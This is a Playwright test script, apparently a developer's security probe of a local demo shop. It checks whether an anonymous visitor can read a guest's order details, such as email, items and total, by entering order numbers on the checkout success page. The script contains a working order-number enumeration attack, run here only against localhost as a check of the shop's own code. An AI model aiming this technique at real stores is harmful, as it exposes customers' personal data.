#!/usr/bin/env node
// Exploit probe: can an anonymous visitor read a GUEST order's details by
// enumerating sequential order numbers on /checkout/success?
import { chromium } from "playwright-core";

const CLONE = "http://localhost:3000";

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1024, height: 768 } });
const page = await ctx.newPage();

// The seed ships ORD-2026-001..003 (john's demo orders - userId set, gated).
// The e2e DB is separate; here we test the DEV db. First check what an
// anonymous visitor sees for a seeded order number.
for (const num of ["ORD-2026-001", "ORD-2026-002"]) {
  await page.goto(`${CLONE}/checkout/success?order=${num}`, { waitUntil: "networkidle" });
  const leak = await page.evaluate(() => {
    const body = document.body.innerText;
    return {
      showsPlaced: body.includes("has been placed"),
      showsConfirmed: body.includes("Order Confirmed"),
      showsEmail: /[\w.+-]+@[\w.-]+\.\w+/.test(body),
      bodySnippet: body.replace(/\s+/g, " ").slice(0, 300),
    };
  });
  console.log(num, JSON.stringify(leak, null, 1));
}

// Now place a GUEST order and try reading it from a FRESH anonymous context.
const guest = await browser.newContext({ viewport: { width: 1024, height: 768 } });
const gp = await guest.newPage();
await gp.goto(`${CLONE}/product/charging-pad`, { waitUntil: "networkidle" });
await gp.getByRole("button", { name: "Add to Cart" }).first().click();
await gp.waitForTimeout(600);
await gp.goto(`${CLONE}/checkout`, { waitUntil: "networkidle" });
await gp.getByRole("main").getByLabel("First Name").fill("Victim");
await gp.getByRole("main").getByLabel("Last Name").fill("Guest");
await gp.getByRole("main").getByLabel("Email").fill("victim-guest@example.com");
await gp.getByRole("main").getByLabel("Address").fill("1 Secret Ln");
await gp.getByRole("main").getByLabel("City").fill("Austin");
await gp.getByRole("main").getByLabel("State").fill("TX");
await gp.getByRole("main").getByLabel("ZIP").fill("73301");
await gp.getByRole("button", { name: "Continue to Payment" }).click();
await gp.getByRole("radio", { name: "PayPal" }).check();
await gp.getByRole("button", { name: "Review Order" }).click();
await gp.getByRole("button", { name: /Place Order/ }).click();
await gp.waitForURL(/\/checkout\/success\?order=/, { timeout: 15000 });
const guestUrl = gp.url();
console.log("guest success URL:", guestUrl);

// Fresh anonymous context, bare order number (the enumeration scenario).
const attacker = await browser.newContext({ viewport: { width: 1024, height: 768 } });
const ap = await attacker.newPage();
const orderNum = decodeURIComponent(guestUrl.match(/order=([^&]+)/)?.[1] ?? "");
await ap.goto(`${CLONE}/checkout/success?order=${orderNum}`, { waitUntil: "networkidle" });
const leak = await ap.evaluate(() => {
  const body = document.body.innerText;
  return {
    showsVictimEmail: body.includes("victim-guest@example.com"),
    showsItems: body.includes("Charging Pad") || body.includes("×"),
    showsTotal: /\$\d+\.\d{2}/.test(body),
    bodySnippet: body.replace(/\s+/g, " ").slice(0, 260),
  };
});
console.log("ATTACKER VIEW (bare order number):", JSON.stringify(leak, null, 1));
await browser.close();
